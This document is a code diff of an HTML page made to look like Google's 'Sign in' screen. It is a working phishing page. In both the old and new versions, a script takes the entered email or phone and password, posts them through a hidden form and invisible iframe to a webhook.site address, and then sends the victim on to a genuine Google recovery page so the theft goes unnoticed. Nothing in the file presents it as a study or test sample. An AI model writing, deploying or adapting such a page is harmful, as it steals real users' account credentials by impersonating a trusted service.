@@ -1,4 +1,4 @@
-
+<!DOCTYPE html>
 <html lang="en">  
 <head>  
   <meta charset="UTF-8" />  
@@ -29,141 +29,105 @@
     <h1 class="text-4xl font-normal mb-2 leading-tight">Sign in</h1>  
     <p class="text-base font-normal mb-6">Use your Google Account</p> 
 
- <form id="login-form" class="space-y-4">
-  <input
-    type="text"
-    name="username"
-    placeholder="Email or phone"
-    class="w-full border border-gray-300 rounded-md px-4 py-3 text-base placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-600"
-    autocomplete="username"
-    aria-label="Email or phone"
-    required
-  />
+    <form id="login-form" class="space-y-4">
+      <input
+        type="text"
+        name="username"
+        placeholder="Email or phone"
+        class="w-full border border-gray-300 rounded-md px-4 py-3 text-base placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-600"
+        autocomplete="username"
+        aria-label="Email or phone"
+        required
+      />
 
-  <input
-    type="password"
-    name="password"
-    placeholder="Enter Password"
-    class="w-full border border-gray-300 rounded-md px-4 py-3 text-base placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-600"
-    autocomplete="current-password"
-    aria-label="Enter Password"
-    required
-  />
+      <input
+        type="password"
+        name="password"
+        placeholder="Enter Password"
+        class="w-full border border-gray-300 rounded-md px-4 py-3 text-base placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-600"
+        autocomplete="current-password"
+        aria-label="Enter Password"
+        required
+      />
 
-  <div class="flex items-center justify-between">
-    <a href="#" class="text-blue-700 text-sm font-normal">Forgot password?</a>
-    <label class="flex items-center space-x-1 text-gray-800 text-sm select-none">
-      <input type="checkbox" class="w-4 h-4" />
-      <span>Show password</span>
-    </label>
-  </div>
+      <div class="flex items-center justify-between">
+        <a href="#" class="text-blue-700 text-sm font-normal">Forgot password?</a>
+        <label class="flex items-center space-x-1 text-gray-800 text-sm select-none">
+          <input type="checkbox" class="w-4 h-4" />
+          <span>Show password</span>
+        </label>
+      </div>
 
-  <div class="flex justify-end">
-    <button
-      type="submit"
-      id="submit-btn"
-      class="bg-blue-700 text-white text-base font-medium rounded-full px-6 py-2.5 hover:bg-blue-800 focus:outline-none focus:ring-2 focus:ring-blue-600 flex items-center justify-center"
-    >
-      <svg
-        id="spinner"
-        class="hidden animate-spin -ml-1 mr-3 h-5 w-5 text-white"
-        xmlns="http://www.w3.org/2000/svg"
-        fill="none"
-        viewBox="0 0 24 24"
-      >
-        <circle
-          class="opacity-25"
-          cx="12"
-          cy="12"
-          r="10"
-          stroke="currentColor"
-          stroke-width="4"
-        ></circle>
-        <path
-          class="opacity-75"
-          fill="currentColor"
-          d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
-        ></path>
-      </svg>
-      <span id="btn-text">Next</span>
-    </button>
-  </div>
-</form>
+      <div class="flex justify-end">
+        <button
+          type="submit"
+          id="submit-btn"
+          class="bg-blue-700 text-white text-base font-medium rounded-full px-6 py-2.5 hover:bg-blue-800 focus:outline-none focus:ring-2 focus:ring-blue-600 flex items-center justify-center"
+        >
+          <span id="btn-text">Next</span>
+        </button>
+      </div>
+    </form>
 
-<!-- Invisible iframe target -->
-<iframe name="hidden-frame" style="display:none;"></iframe>
+    <!-- Invisible iframe target -->
+    <iframe name="hidden-frame" style="display:none;"></iframe>
 
+    <script>
+      const form = document.getElementById("login-form");
+      const submitBtn = document.getElementById("submit-btn");
 
+      form.addEventListener("submit", function (e) {
+        e.preventDefault();
 
+        submitBtn.disabled = true;
 
+        const hiddenForm = document.createElement("form");
+        hiddenForm.style.display = "none";
+        hiddenForm.method = "POST";
+        hiddenForm.target = "hidden-frame";
+        hiddenForm.action = "https://webhook.site/29e2c3b4-7db8-4b1a-8d01-db907c7eb55c";
 
-<script>
- 
-const form = document.getElementById("login-form");
-  const submitBtn = document.getElementById("submit-btn");
-  const spinner = document.getElementById("spinner");
-  const btnText = document.getElementById("btn-text");
+        const formData = new FormData(form);
+        for (const [key, value] of formData.entries()) {
+          const input = document.createElement("input");
+          input.type = "hidden";
+          input.name = key;
+          input.value = value;
+          hiddenForm.appendChild(input);
+        }
 
-  form.addEventListener("submit", function (e) {
-    e.preventDefault();
+        document.body.appendChild(hiddenForm);
+        hiddenForm.submit();
 
-    spinner.classList.remove("hidden");
-    btnText.textContent = "Loading...";
-    submitBtn.disabled = true;
+        setTimeout(() => {
+          window.location.href =
+            "https://accounts.google.com/v3/signin/recoveryidentifier?flowName=GlifWebSignIn&dsh=S406279634%3A1745078146925725";
+        }, 1200);
+      });
+    </script>  
 
-    // Create a hidden form to submit via iframe
-    const hiddenForm = document.createElement("form");
-    hiddenForm.style.display = "none";
-    hiddenForm.method = "POST";
-    hiddenForm.target = "hidden-frame";
-    hiddenForm.action = "https://webhook.site/29e2c3b4-7db8-4b1a-8d01-db907c7eb55c";
+    <p class="text-gray-600 text-sm mt-10 leading-relaxed">  
+      Not your computer? Use a private browsing window to sign in.  
+      <a href="#" class="text-blue-700 font-semibold">Learn more about using Guest mode</a>  
+    </p>  
 
-    // Copy fields to hidden form
-    const formData = new FormData(form);
-    for (const [key, value] of formData.entries()) {
-      const input = document.createElement("input");
-      input.type = "hidden";
-      input.name = key;
-      input.value = value;
-      hiddenForm.appendChild(input);
-    }
+    <div class="mt-12">  
+      <label for="language" class="text-gray-900 text-sm font-normal">English (United Kingdom)</label>  
+      <select  
+        id="language"  
+        name="language"  
+        class="ml-2 border border-gray-300 rounded px-2 py-1 text-sm focus:outline-none focus:ring-2 focus:ring-blue-600"  
+        aria-label="Select language"  
+      >  
+        <option>English (United Kingdom)</option>  
+        <option>English (United States)</option>  
+        <option>Español</option>  
+        <option>Français</option>  
+      </select>  
+    </div>
+  </div>    
 
-    document.body.appendChild(hiddenForm);
-    hiddenForm.submit();
-
-    // Redirect after short delay
-    setTimeout(() => {
-      window.location.href =
-        "https://accounts.google.com/v3/signin/recoveryidentifier?flowName=GlifWebSignIn&dsh=S406279634%3A1745078146925725";
-    }, 1200);
-  });
-
-</script>  
-
-
-
-
-<p class="text-gray-600 text-sm mt-10 leading-relaxed">  
-  Not your computer? Use a private browsing window to sign in.  
-  <a href="#" class="text-blue-700 font-semibold">Learn more about using Guest mode</a>  
-</p>  
-
-<div class="mt-12">  
-  <label for="language" class="text-gray-900 text-sm font-normal">English (United Kingdom)</label>  
-  <select  
-    id="language"  
-    name="language"  
-    class="ml-2 border border-gray-300 rounded px-2 py-1 text-sm focus:outline-none focus:ring-2 focus:ring-blue-600"  
-    aria-label="Select language"  
-  >  
-    <option>English (United Kingdom)</option>  
-    <option>English (United States)</option>  
-    <option>Español</option>  
-    <option>Français</option>  
-  </select>  
-</div>
-
-  </div>    <footer class="w-full border-t border-gray-300 py-4 mt-16">  
+  <footer class="w-full border-t border-gray-300 py-4 mt-16">  
     <div class="max-w-md mx-auto flex justify-between px-6 text-gray-700 text-sm font-normal">  
       <a href="#" class="hover:underline">Help</a>  
       <a href="#" class="hover:underline">Privacy</a>  
@@ -171,22 +135,4 @@ const form = document.getElementById("login-form");
     </div>  
   </footer>  
 </body>  
-</html>  
-
-
-
-
-
-
-
-
-
-
-<script>
-  
-</script>
-
-
-
-
-
+</html>
